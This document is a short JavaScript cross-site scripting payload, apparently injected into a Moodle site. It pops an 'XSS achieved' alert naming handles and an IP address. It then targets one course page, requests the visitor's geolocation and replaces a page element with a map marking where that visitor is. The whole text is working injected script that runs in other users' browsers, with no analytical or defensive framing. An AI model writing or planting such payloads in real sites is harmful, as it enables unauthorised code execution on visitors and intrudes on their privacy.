alert('XSS achieved!!! :3 ~ wntiv_, 162.159.137.232, amsaynz');

(function(){
  if(new URLSearchParams(window.location.search).get('id') !== '219026') return;

  const container = document.querySelector('.filter_generico_tabitem[title*="moodle-xss"]');
  if(!container) return;
  container.style.height = '400px';

  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(
      pos => {
        const {latitude: lat, longitude: lon} = pos.coords;
        const iframe = document.createElement('iframe');
        iframe.src = `https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.05}%2C${lat-0.05}%2C${lon+0.05}%2C${lat+0.05}&layer=mapnik&marker=${lat}%2C${lon}`;
        iframe.width = '100%';
        iframe.height = '100%';
        iframe.style.border = '0';
        container.innerHTML = '';
        container.appendChild(iframe);
      }
    );
  }
})();
